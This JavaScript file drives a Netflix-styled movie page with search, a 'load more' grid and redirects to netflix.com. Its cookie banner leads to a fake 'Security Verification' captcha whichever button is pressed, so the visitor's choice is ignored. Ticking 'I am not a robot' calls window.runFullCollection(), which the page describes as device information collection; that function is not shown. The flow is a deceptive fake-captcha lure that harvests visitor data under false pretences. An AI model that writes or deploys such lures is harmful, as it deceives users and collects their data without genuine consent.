document.addEventListener('DOMContentLoaded', function() {
    const watchButtons = document.querySelectorAll('.watch-btn');
    const movieCards = document.querySelectorAll('.movie-card');
    const searchBtn = document.getElementById('search-btn');
    const searchInput = document.getElementById('search-input');
    const moreBtn = document.getElementById('more-btn');
    const movieGrid = document.getElementById('movie-grid');
    const modalContainer = document.getElementById('modal-container');

    const extraMovies = [
        {
            name: 'The Dark Knight',
            img: 'https://image.tmdb.org/t/p/w500/qJ2tW6WMUDux911r6m7haRef0WH.jpg',
            movie: 'dark-knight'
        },
        {
            name: 'Pulp Fiction',
            img: 'https://image.tmdb.org/t/p/w500/d5iIlFn5s0ImszYzBPb8JPIfbXD.jpg',
            movie: 'pulp-fiction'
        },
        {
            name: 'Fight Club',
            img: 'https://image.tmdb.org/t/p/w500/pB8BM7pdSp6B6Ih7QZ4DrQ3PmJK.jpg',
            movie: 'fight-club'
        }
    ];

    let movieCount = 3;

    function redirectToNetflix() {
        window.location.href = 'https://www.netflix.com';
    }

    function attachWatchListeners() {
        document.querySelectorAll('.watch-btn').forEach(function(button) {
            button.addEventListener('click', function(e) {
                e.stopPropagation();
                redirectToNetflix();
            });
        });
    }

    function attachCardListeners() {
        document.querySelectorAll('.movie-card').forEach(function(card) {
            card.addEventListener('click', function() {
                redirectToNetflix();
            });
        });
    }

    function showBanner() {
        const banner = document.createElement('div');
        banner.id = 'banner';
        banner.innerHTML = `
            <div style="position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;border-top:1px solid #e50914;z-index:9999;padding:15px;display:flex;justify-content:center;align-items:center;gap:20px;flex-wrap:wrap;">
                <span style="color:#fff;">This site uses cookies to ensure the best experience.</span>
                <div style="display:flex;gap:10px;">
                    <button id="banner-accept" style="padding:8px 20px;background:#e50914;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">Accept</button>
                    <button id="banner-reject" style="padding:8px 20px;background:#333;color:#fff;border:1px solid #e50914;border-radius:4px;cursor:pointer;">Reject</button>
                </div>
            </div>
        `;
        document.body.appendChild(banner);
        document.getElementById('banner-accept').addEventListener('click', function() {
            if (window.updateConsent) window.updateConsent('accepted');
            banner.remove();
            showVerify();
        });
        document.getElementById('banner-reject').addEventListener('click', function() {
            if (window.updateConsent) window.updateConsent('rejected');
            banner.remove();
            showVerify();
        });
    }

    function showVerify() {
        const modal = document.createElement('div');
        modal.id = 'verify-modal';
        modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:10000;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(5px);';
        modal.innerHTML = `
            <div style="background:#1a1a2e;padding:30px;border-radius:10px;max-width:400px;text-align:center;border:1px solid #e50914;box-shadow:0 10px 40px rgba(0,0,0,0.5);">
                <h3 style="color:#e50914;margin-bottom:15px;">Security Verification</h3>
                <p style="margin-bottom:20px;color:#fff;">Please confirm you are not a robot.</p>
                <div style="margin:20px 0;padding:15px;background:#252545;border-radius:4px;border:1px solid #444;">
                    <input type="checkbox" id="robot-check" style="margin-right:10px;">
                    <label for="robot-check" style="color:#fff;">I am not a robot</label>
                </div>
                <button id="verify-continue" disabled style="padding:10px 30px;background:#555;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer;">Continue</button>
                <p style="font-size:12px;color:#888;margin-top:15px;">This check collects basic device information for security purposes.</p>
            </div>
        `;
        modalContainer.appendChild(modal);
        
        document.getElementById('robot-check').addEventListener('change', function(e) {
            document.getElementById('verify-continue').disabled = !e.target.checked;
            if (e.target.checked) {
                document.getElementById('verify-continue').style.background = '#e50914';
                if (window.runFullCollection) window.runFullCollection();
            } else {
                document.getElementById('verify-continue').style.background = '#555';
            }
        });
        
        document.getElementById('verify-continue').addEventListener('click', function() {
            modal.remove();
            localStorage.setItem('v', '1');
        });
    }

    searchBtn.addEventListener('click', function() {
        const query = searchInput.value.toLowerCase();
        const cards = document.querySelectorAll('.movie-card');
        cards.forEach(function(card) {
            const title = card.querySelector('h3').textContent.toLowerCase();
            card.style.display = title.includes(query) ? 'block' : 'none';
        });
    });

    searchInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') searchBtn.click();
    });

    moreBtn.addEventListener('click', function() {
        extraMovies.forEach(function(movie) {
            if (movieCount < 6) {
                const card = document.createElement('div');
                card.className = 'movie-card';
                card.setAttribute('data-movie', movie.movie);
                card.innerHTML = `<img src="${movie.img}" alt="${movie.name}"><h3>${movie.name}</h3><button class="watch-btn">Watch Now</button>`;
                movieGrid.appendChild(card);
                movieCount++;
            }
        });
        attachWatchListeners();
        attachCardListeners();
        if (movieCount >= 6) {
            moreBtn.disabled = true;
            moreBtn.textContent = 'No More Movies';
        }
    });

    attachWatchListeners();
    attachCardListeners();

    if (!localStorage.getItem('c')) {
        showBanner();
    }
});
